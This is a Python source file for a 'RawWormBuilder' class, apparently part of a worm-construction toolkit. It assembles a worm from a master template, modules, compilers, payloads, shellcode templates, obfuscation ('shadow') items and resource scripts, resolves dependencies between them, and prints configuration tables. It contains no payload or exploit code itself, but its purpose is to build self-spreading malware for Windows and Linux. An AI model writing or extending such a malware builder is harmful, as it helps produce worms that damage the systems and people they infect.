from __future__ import annotations
from typing import Union, TYPE_CHECKING

from .Lib.src.raw_item_constructor import RawItemConstructor
from .mods.icons import Icons
from .raw_worm import RawWorm

if TYPE_CHECKING:
    from .Lib.src.items_src.raw_lib_item import RawLibItem
    from .Lib.src.payload_variable import PayloadVariable


class RawWormBuilder:
    def __init__(self, queen: object, library: object):
        self.name = "RawWormBuilder"
        self.queen = queen
        self.msg = self.queen.msg
        self.library = library
        self.getLibItem = self.library.getLibItem
        self.raw_constructor = RawItemConstructor(self.queen)
        self.Icons = Icons(self.queen.DIR_ICONS)
        self.RAW = RawWorm(self)

        self.CONSOLE_SCR = self.queen.conf.console_screen
        self.DEFAULT_TITLE_COLOR = "white"
        
    
    @property
    def wormName(self) -> str:
        return self.RAW.worm_name
    
    @property
    def wormAllMods(self) -> list:
        return self.RAW.allMods
    
    def wormGetChild(self, owner_module: Union[str, object]) -> list:
        return self.RAW.getChild(owner_module)
    
    def wormGetChildAll(self, owner_module: Union[str, object]) -> list:
        return self.RAW.getChildAll(owner_module)
    
    def wormGetModCompiler(self, owner_name: str) -> Union[RawLibItem, None]:
        return self.RAW.mods_compiler.get(owner_name)


    
    def test(self) -> None:
        self.showWorm()
        for k, i in self.RAW.sfiles.items():
            print(k, i.owner)


    def resetWorm(self) -> None:
        self.RAW = RawWorm(self)
        self.msg("msg", "Reset Raw Worm. Start new template.", sender=self.name)
    
    def setWormName(self, name: str) -> None:
        self.RAW.worm_name = name
        self.msg("msg", f"Set new name for worm: '{name}'.", sender=self.name)
    
    def setIcon(self, name: str) -> None:
        if self.Icons.set_icon(name):
            self.msg("msg", f"Set new icon: '{name}'", sender=self.name)
        else:
            self.msg("error", f"[!!] ERROR: Can't find icon: '{name}' [!!]", sender=self.name)
    
    def get_target(self, name: Union[str, object]) -> Union[object, None]:
        if isinstance(name, str):
            target = self.RAW.getModule(name)
        else:
            target = name
        return target
        
    
    def Add(self, module_type: str, module_name: str, target: str = None) -> None:
        pre_item = self.getLibItem(module_type, module_name)
        if not pre_item:
            return
        self.addWormItem(pre_item, target)
    
    def addWormItem(self, raw_info: object, target: Union[str, object] = None) -> None:
        if not self.RAW.master_worm and raw_info.itemType != "worm":
            self.msg("error", "[!!] ERROR: First you need add worm (Master Template Worm) [!!]", sender=self.name)
            return
        if raw_info.itemType == "support":
            self.msg("error", "[!!] You can't add this type of module. It's managed by the worm. [!!]", sender=self.name)
            return
        match raw_info.itemType:
            case "worm":
                self.addMasterWorm(raw_info)
            case "module":
                self.addWormModule(raw_info, target)
            case "compiler":
                self.addCompiler(raw_info, target)
            case "payload":
                self.addPayload(raw_info, target)
            case "shadow":
                self.addShadow(raw_info, target)
            case "scode":
                self.addShellcodeTemplate(raw_info, target)
            case "rscript":
                self.addResourcesScript(raw_info, target)
            case _:
                self.msg("error", f"[!!] ERROR: Unknown module type: '{raw_info.itemType}' [!!]", sender=self.name)
                return
    
    def removeWormItem(self, item_type: str, item_name: str) -> None:
        if item_type == "worm":
            self.msg("error", "The main module cannot be removed. Please use the appropriate function.", sender=self.name)
            return
        if item_type == "support":
            self.msg("error", "This type of module cannot be removed. They are automatically added by the worm.", sender=self.name)
            return
        for mod in self.wormAllMods:
            if mod.name == item_name:
                self._remove_child_item(mod)
                self._remove_worm_item(mod)
                return
        self.msg("error", f"[!!] ERROR: {item_name} is not added to worm. [!!]", sender=self.name)
    
    def _remove_worm_item(self, module: RawLibItem, is_child: bool = False) -> None:
        if is_child:
            child = "child"
        else:
            child = ""
        match module.itemType:
            case "module":
                del self.RAW.modules[module.name]
                self.msg("msg", f"Remove {child} module: {module.name} successfull.", sender=self.name)
            case "shadow":
                del self.RAW.shadow[module.name]
                self.msg("msg", f"Remove {child} shadow: {module.name} successfull.", sender=self.name)              
            case "compiler":
                self.RAW.master_compiler = None
                self.msg("msg", f"Remove {child} compiler: {module.name} successfull.", sender=self.name)


    
    def _remove_child_item(self, module: RawLibItem) -> None:
        for cmod in self.RAW.getChildAll(module):
            self._remove_worm_item(cmod, True)



    def addMasterWorm(self, raw_info: object) -> None:
        if self.RAW.master_worm:
            self.msg("error", "[!!] ERROR: You can't add a main template to an existing worm. Use the 'reset' command. [!!]", sender=self.name)
            return
        master = self.raw_constructor.buildRawItem(raw_info)
        self.RAW.master_worm = master
        self.msg("msg", f"Add master worm: '{master.name}' successfull.", sender=self.name)
        self.check_depediences(master)
    
    def addWormProcess(self, raw_info: Union[str, object], target: object = None) -> None:
        if isinstance(raw_info, str):
            raw_info = self.getLibItem("Wprocess", raw_info)
        wproc = self.raw_constructor.buildRawItem(raw_info)
        target.Wprocess = wproc
        self.msg("msg", f"Set Process '{wproc.name}' to '{target.name}' successfull.", sender=self.name)
        self.check_depediences(wproc)
        
    def addWormModule(self, raw_info: object, target: str = None, force_add: bool = False, is_support: bool = False) -> None:
        if not target:
            target = self.RAW.master_worm
        else:
            target = self.get_target(target)
        if not target:
            self.msg("error", "[!!] ERROR: target module does not exist in worm. [!!]", sender=self.name)
            return
        
        if not force_add:
            if not self.check_compatibility(raw_info, target):
                self.msg("error", f"[!!] ERROR: module: '{raw_info.name}' is not compatibilty with '{target.name}'. [!!]", sender=self.name)
                return
        module = self.raw_constructor.buildRawItem(raw_info)
        # set owner
        module.owner = target
        if is_support:
            module.FLAG_support = True
        self.RAW.modules[module.name] = module
        self.msg("msg", f"Add module: '{module.name}' to '{module.owner.name}' successfull.", sender=self.name)
        self.check_depediences(module)
    
    def addSupportFile(self, sfile_name: str, target_name: str, owner: RawLibItem) -> None:
        sfile = self.getLibItem("sfile", sfile_name)
        if not sfile:
            self.msg("error", f"[!!] ERROR: Missing support file: {sfile_name} [!!]", sender=self.name)
            return
        sfile = self.raw_constructor.buildRawItem(sfile)
        sfile.supportFileCodeName = target_name
        sfile.owner = owner
        self.RAW.sfiles[sfile.name] = sfile
        self.msg("msg", f"Add support file: {sfile.name} to {owner.name} successfull.", sender=self.name)
        self.check_depediences(sfile)

    def addCompiler(self, raw_info: object, target: Union[str, object] = None) -> None:
        if not target:
            target = self.RAW.master_worm
        else:
            if isinstance(target, str):
                # target = self.getLibItem("compiler", target)
                target = self.get_target(target)
                if not target:
                    self.msg("error", "[!!] ERROR: Target module does not exists [!!]", sender=self.name)
                    return
        comp = self.raw_constructor.buildRawItem(raw_info)
        comp.owner = target
        self.RAW.master_compiler = comp
        self.msg("msg", f"Add compiler: '{comp.name}' to '{target.name}' successfull", sender=self.name)
        self.check_depediences(comp)
    
    def addModCompiler(self, raw_info: object, target: Union[str, object]) -> None:
        if isinstance(target, str):
            target = self.get_target(target)
            if not target:
                self.msg("error", "[!!] ERROR: Target module does not exists [!!]", sender=self.name)
                return
        comp = self.raw_constructor.buildRawItem(raw_info)
        comp.owner = target
        self.RAW.mods_compiler[target.name] = comp
        self.msg("msg", f"Add special compiler: '{comp.name}' to module: '{target.name}' successfull.", sender=self.name)
        self.check_depediences(comp)
    
    def _get_payload_target(self) -> PayloadVariable:
        # check for empty payload
        for k, pay in self.RAW.payloads.items():
            if not pay.status:
                return pay
        # get first
        for k, pay in self.RAW.payloads.items():
            return pay
        
    def addPayload(self, raw_info: object, target: Union[str, object, None]) -> None:
        if len(self.RAW.payloads) == 0:
            self.msg("error", f"[!!] ERROR: Worm and any module don't have space for payload. [!!]", sender=self.name)
            return
        if not target:
            target = self._get_payload_target()
        elif isinstance(target, str):
            target = self.RAW.payloads.get(target)
            if not target:
                self.msg("error", "[!!] ERROR: Target module does not exists [!!]", sender=self.name)
                return
        payload = self.raw_constructor.buildRawItem(raw_info)
        # payload owner is module owner
        payload.owner = target.owner
        # add 'payload lib module' to 'payload variable'
        target.addModule(payload)
        self.RAW._payloads[target.name] = payload
        self.msg("msg", f"Add payload: '{payload.name}' to '{payload.owner.name}' successfull.", sender=self.name)


    def addFood(self, var_name: str, food_name: str, target: Union[str, object]) -> None:
        vname = self.RAW.checkFood(var_name)
        if not vname:
            self.msg("error", f"[!!] ERROR: Variable: '{var_name}' does not exist", sender=self.name)
            return
        if isinstance(target, str):
            target = self.get_target(target)
        if not target:
            self.msg("error", f"[!!] ERROR: Can't set FOOD Owner. [!!]", sender=self.name)
            return
        raw_food_info = self.getLibItem("food", food_name)
        if not raw_food_info:
            return
        food = self.raw_constructor.buildRawItem(raw_food_info)
        food.owner = target
        food.name = var_name
        if isinstance(vname, str):
            self.RAW.food[var_name] = food
        else:
            vname.set_value(food.Value)
            vname.info = food.info
        self.msg("msg", f"Add FOOD: '{food_name}' successfull.", sender=self.name)

    def addFoodAsVar(self, var_name: str, food_name: str) -> None:
        owner = self.RAW.variables.get(var_name)
        if not owner:
            self.msg("error", f"[!!] ERROR: Variable: {var_name} does not exists. [!!]", sender=self.name)
            return
        owner = owner.owner
        self.addFood(var_name, food_name, owner)
    
    def setVariable(self, var_name: str, value: any, val_type: str = "str") -> None:
        var = self.RAW.variables.get(var_name)
        if not var:
            self.msg("error", f"[!!] ERROR: Variable {var_name} does not exists. [!!]", sender=self.name)
            return
        var.set_value(value, val_type)
        self.msg("msg", f"Set variable: '{var_name}' successfull.", sender=self.name)
    
    def addShadow(self, raw_info: object, target: Union[str, object, None]) -> None:
        if not target:
            target = self.RAW.master_worm
        if isinstance(target, str):
            target = self.get_target(target)
        if not target:
            self.msg("error", f"[!!] ERROR: Target module does not exists in worm. [!!]", sender=self.name)
            return
        if not self.check_compatibility(raw_info, target):
            self.msg("error", f"[!!] ERROR: Target module is not compatibilty with '{raw_info.name}'. [!!]", sender=self.name)
            return
        shadow = self.raw_constructor.buildRawItem(raw_info)
        shadow.owner = target
        self.RAW.shadow[shadow.name] = shadow
        self.msg("msg", f"Add Shadow: {shadow.name} to {target.name} successfull.", sender=self.name)
        self.check_depediences(shadow)
    
    def addShellcodeTemplate(self, raw_info: object, target: Union[str, object, None]) -> None:
        if not target:
            target = self.RAW.master_worm
        if isinstance(target, str):
            target = self.get_target(target)
        if not target:
            self.msg("error", f"[!!] ERROR: Target module does not exists in worm. [!!]", sender=self.name)
            return
        if not self.check_compatibility(raw_info, target):
            self.msg("error", f"[!!] ERROR: Target module is not compatibility with shellcode templates. [!!]", sender=self.name)
            return
        scode = self.raw_constructor.buildRawItem(raw_info)
        scode.owner = target
        self.RAW.scode = scode
        self.msg("msg", f"Add shellcode template: {scode.name} successfull.", sender=self.name)
        self.check_depediences(scode)
    
    def addResourcesScript(self, raw_info: object, target: Union[str, object, None], force_add: bool = False) -> None:
        if not target:
            if not self.RAW.master_compiler:
                self.msg("error", "[!!] ERROR: To add Resource Script you must have a compiler added. [!!]", sender=self.name)
                return
            target = self.RAW.master_compiler
        if isinstance(target, str):
            target = self.get_target(target)
        if not target:
            self.msg("error", f"[!!] ERROR: Target module does not exists in worm. [!!]", sender=self.name)
            return
        if not force_add:
            if not self.check_compatibility(raw_info, target):
                self.msg("error", f"[!!] ERROR: Rscript is not compatibility with compiler.")
                return
        rcscript = self.raw_constructor.buildRawItem(raw_info)
        rcscript.owner = target
        rcscript.setCompilerOwner(target)
        target.setCompilerRC(rcscript)
        self.RAW.rscript[rcscript.name] = rcscript
        self.msg("msg", f"Add Resources Script: {rcscript.name} to compiler: {target.name} successfull.", sender=self.name)
        self.check_depediences(rcscript)

        

    def check_compatibility(self, raw_info: object, owner_module: object) -> bool:
        for tag in raw_info.hiveType:
            if tag in owner_module.typeAccept:
                return True
        return False

    
    def check_depediences(self, raw_mod: RawLibItem) -> None:
        self.msg("msg", "Check depediences....", sender=self.name)
        self.msg("dev", f"Check: {raw_mod.name}", sender=self.name)
        # check req mods
        for rmod in raw_mod.reqMod:
            if rmod in self.RAW.modules.keys():
                continue
            # check support mods
            nmod = self.getLibItem("support", rmod, False)
            if not nmod:
                # check standard mods
                nmod = self.getLibItem("module", rmod, False)
                if not nmod:
                    self.msg("error", f"[!!] ERROR: Module: '{rmod}' does not exists. [!!]")
                    continue

            self.addWormModule(nmod, raw_mod, True, True)
        
        # check support file
        for sup_name, sup_code_name in raw_mod.inFile.items():
            if sup_name in self.RAW.sfiles.keys():
                continue
            self.addSupportFile(sup_name, sup_code_name, raw_mod)
        
        # check for payloads
        # for name, info in raw_mod.payloadSpace.items():
        #     if name in self.RAW.payloads.keys():
        #         continue
        #     self.RAW.payloads[name] = info


        # check for process
        if raw_mod.Wprocess:
            self.addWormProcess(raw_mod.Wprocess, raw_mod)
            
        if raw_mod.wormCompiler:
            if self.RAW.master_compiler:
                self.msg("error", f"[!!] WARNING: Module: '{raw_mod.name}' requires a different compiler than is currently set.", sender=self.name)
            else:
                comp = self.getLibItem("compiler", raw_mod.wormCompiler)
                if not comp:
                    self.msg("error", f"[!!] ERROR: Compiler: {raw_mod.wormCompiler} does not exists in library. [!!]", sender=self.name)
                else:
                    self.addCompiler(comp, raw_mod)
        
        if raw_mod.modCompiler:
            comp = self.getLibItem("compiler", raw_mod.modCompiler)
            if not comp:
                self.msg("error", f"[!!] ERROR: Compiler: {raw_mod.modCompiler} does not exists in library. [!!]", sender=self.name)
            else:
                self.addModCompiler(comp, raw_mod)
        
        # check required RC Script for compiler
        if raw_mod.itemType == "compiler":
            if raw_mod.reqRC:
                rscript = self.getLibItem("rscript", raw_mod.reqRC)
                if not rscript:
                    self.msg("error", f"[!!] ERROR: Required RC Script: {raw_mod.reqRC} does not exists in library. [!!]", sender=self.name)
                else:
                    self.addResourcesScript(rscript, raw_mod)
        
        # check for food
        for fname, vname in raw_mod.foodReq.items():
            self.addFood(vname, fname, raw_mod)
    

    ############################ SHOW FUNCTIONS ##################################
    def showInfo(self) -> None:
        self.msg("msg", " Description, Cheat Sheet ", mtypes="title", sender=self.name, color=self.DEFAULT_TITLE_COLOR)
        self.msg("msg", "Worm Tags:", sender=self.name, no_separator=True)
        self.msg("msg", "<< WIN >> - Only works with Windows.", sender=self.name, no_separator=True)
        self.msg("msg", "<< LIN >> - Only works with Linux.", sender=self.name, no_separator=True)
        self.msg("msg", "<< LW >> - Works with Linux and Windows.", sender=self.name, no_separator=True)
        self.msg("msg", "<< PyS >> - Standard Python Script. Includes standard libraries.", sender=self.name, no_separator=True)
        self.msg("msg", "<< PyEx >> - Python script requiring additional libraries installed via PIP.", sender=self.name, no_separator=True)
        self.msg("msg", "<< sM >> - Support Module. 'Support Module' are added automatically by worm constructor.", sender=self.name, no_separator=True)
        self.msg("msg", "<< PY_MOD >> - A Python code module. Most often included with the main code.", sender=self.name, no_separator=True)
        self.msg("msg", "<< SCode >> - Shellcode template.", sender=self.name, no_separator=True)
        self.msg("msg", "<< PySM >> - A module written in Python containing standard libraries.", sender=self.name, no_separator=True)
        self.msg("msg", "<< PyExM >> - Module written in Python requiring additional libraries from PIP.", sender=self.name, no_separator=True)
        self.msg("msg", "<< PySh >> - Python code obfuscation.", sender=self.name, no_separator=True)
        
    def correct_tags(self, tag_list: list) -> str:
        tag = ""
        for t in tag_list:
            tag += f"[{t}] "
        return tag
        
    def showMasterWorm(self, no_separator: bool = False) -> None:
        self.msg("empty")
        self.msg("msg", "  Master Worm Info:  ", mtypes="title", sender=self.name, no_separator=no_separator, color=self.DEFAULT_TITLE_COLOR)
        tab = {}
        tab["headers"] = []
        tab["data"] = []
        if not self.RAW.wprocess:
            wprocess = "NOT LOADED"
        else:
            wprocess = self.RAW.wprocess.info
        if not self.RAW.master_compiler:
            mcompiler = "NOT LOADED"
        else:
            mcompiler = f'[{self.RAW.master_compiler.name}] - {self.RAW.master_compiler.info}'
        accept_types = self.RAW.acceptItemList
        if len(accept_types) == 0:
            accept_types = "Worm does not allow adding any modules."
        else:
            accept_types = self.correct_tags(accept_types)
        tab["data"].append(["Worm Name:", self.wormName])
        tab["data"].append(["Source Lang:", self.RAW.master_worm.lang])
        tab["data"].append(["Master Template:", self.RAW.master_worm.name])
        tab["data"].append(["Description: ", self.RAW.master_worm.info])
        # tab["data"].append(["Worm Tags:", self.correct_tags(self.RAW.master_worm.moduleTags)])
        tab["data"].append(["Worm Tags:", self.correct_tags(self.RAW.tagsInfo)])
        tab["data"].append(["Accepted Items:", accept_types])
        tab["data"].append(["Worm Process:", wprocess])
        tab["data"].append(["Worm Compiler:", mcompiler])
        tab["width"] = self.CONSOLE_SCR["2c"]
        self.msg("msg", tab, mtypes="table", sender=self.name, no_separator=True)
        print("\n")
    
    def showVariables(self, no_separator: bool = False) -> None:
        tab = {}
        tab["headers"] = ["Name:", "Owner", "Value:", "Description:"]
        tab["data"] = []
        for var in self.RAW.variables.values():
            # prevent ERROR textwrap (munge_white_space)
            value = f" {var.show_value()} "
            tab["data"].append([var.name, f"<< {var.owner.name} >>", value, var.info])
        if len(tab["data"]) == 0:
            return
        # show foods
        for fname, food in self.RAW.food.items():
            value = f" {food.show_value()} "
            tab["data"].append([f"{fname} [FOOD]", f"<< {food.owner.name} >>", value, food.info])
        tab["width"] = self.CONSOLE_SCR["4c"]
        self.msg("msg", f"  {self.wormName} variables:  ", mtypes="title", sender=self.name, no_separator=no_separator, color=self.DEFAULT_TITLE_COLOR)
        self.msg("msg", tab, mtypes="table", sender=self.name, no_separator=no_separator)
        print("\n")
    
    def showProcessWorm(self, no_separator: bool = False) -> None:
        proc = ""
        for step in self.RAW.wprocess.process_sheme:
            proc += f"[{step}] --> "
        self.msg("msg", f"  {self.wormName} Process Sheme:  ", mtypes="title", sender=self.name, no_separator=no_separator, color=self.DEFAULT_TITLE_COLOR)
        tab = {}
        tab["headers"] = ["Process Name:", "Sheme:"]
        tab["data"] = [[self.RAW.wprocess.name, proc]]
        tab["width"] = self.CONSOLE_SCR["2c"]
        self.msg("msg", tab, mtypes="table", no_separator=no_separator, sender=self.name)
        print("\n")
    
    def showPayloads(self, no_separator: bool = False) -> None:
        if len(self.RAW.payloads) == 0:
            return
        tab = {}
        tab["headers"] = ["Name:", "Status:", "Owner:", "Description:"]
        tab["data"] = []
        for name, pay in self.RAW.payloads.items():
            if name in self.RAW._payloads.keys():
                pay_item = self.RAW._payloads[name]
                tab["data"].append([name, f"<<{pay.status_str}>>", pay_item.owner.name, pay_item.info])
            else:
                tab["data"].append([pay.name, f"<<{pay.status_str}>>", pay.owner.name, pay.info])
        tab["width"] = self.CONSOLE_SCR["4c"]
        self.msg("msg", f"  {self.wormName} Payloads:  ", mtypes="title", sender=self.name, no_separator=no_separator, color=self.DEFAULT_TITLE_COLOR)
        self.msg("msg", tab, mtypes="table", no_separator=no_separator, sender=self.name)
        print("\n")
    
    def showModules(self, no_separator: bool =  False) -> None:
        if len(self.RAW.modules) == 0 and not self.RAW.scode:
            return
        tab = {}
        tab["headers"] = ["Module Name:", "Tags:", "Owner:", "Description:"]
        tab["data"] = []
        for mod in self.RAW.modules.values():
            mod_tag = mod.moduleTags
            if mod.itemType == "support":
                mod_tag.append("sM")
            tab["data"].append([mod.name, self._build_info_tags(mod_tag), mod.owner.name, mod.info])
        # add shellcode template
        if self.RAW.scode:
            tab["data"].append([f"{self.RAW.scode.name} [SCODE]", self._build_info_tags(self.RAW.scode.moduleTags), self.RAW.scode.owner.name, self.RAW.scode.info])
        # add shadow
        for sh in self.RAW.shadow.values():
            tab["data"].append([f"{sh.name} [SH]", self._build_info_tags(sh.moduleTags), sh.owner.name, sh.info])
        tab["width"] = self.CONSOLE_SCR["4c"]
        self.msg("msg", f"  {self.wormName} Modules:  ", mtypes="title", sender=self.name, no_separator=no_separator, color=self.DEFAULT_TITLE_COLOR)
        self.msg("msg", tab, mtypes="table", no_separator=no_separator, sender=self.name)
        print("\n")

    def _build_info_tags(self, tag_list: list, sheme: str = "[$]") -> str:
        sheme = sheme.split("$")
        tags = ""
        for t in set(tag_list):
            tags += f"{sheme[0]}{t}{sheme[1]} "
        return tags
    
    def showRcScript(self, no_separator: bool = False) -> None:
        rcs = self.RAW.masterRcScript
        if not rcs:
            return
        tab = {}
        tab["headers"] = ["RC Name:", "Owner:", "Description:"]
        tab["data"] = [[rcs.name, f"<< {rcs.compilerOwner.name} >>", rcs.info]]
        tab["width"] = self.CONSOLE_SCR["3c"]
        self.msg("msg", f"  {rcs.compilerOwner.name} RC Script:  ", mtypes="title", sender=self.name, no_separator=no_separator, color=self.DEFAULT_TITLE_COLOR)
        self.msg("msg", tab, mtypes="table", no_separator=no_separator, sender=self.name)
        print("\n")

    def showWorm(self) -> None:
        if not self.RAW.master_worm:
            self.msg("msg", "[!!] Worm is empty [!!]", sender=self.name)
            return
        self.showInfo()
        self.showMasterWorm(True)
        self.showModules(True)
        self.showPayloads(True)
        self.showVariables(True)
        self.showRcScript(True)
        self.showProcessWorm(True)
        print("\n")
    
    def showWormComp(self, options: list) -> None:
        show = []
        if "info" in options:
            show.append(self.showInfo)
        if not self.RAW.master_worm:
            if len(show) == 0:
                self.msg("msg", "[!!] Worm is empty [!!]", sender=self.name)
                return
            else:
                show[0]()
        

    def showIconList(self) -> None:
        self.msg("msg", f"  Icon list:  ", mtypes="title", sender=self.name, color=self.DEFAULT_TITLE_COLOR)
        tab = {}
        tab["headers"] = ["Icon Name:", "Size:"]
        tab["data"] = []
        for icon in self.Icons.get_info():
            tab["data"].append([icon[0], icon[1]])
        tab["width"] = self.CONSOLE_SCR["2c"]
        self.msg("msg", tab, mtypes="table", no_separator=True, sender=self.name)
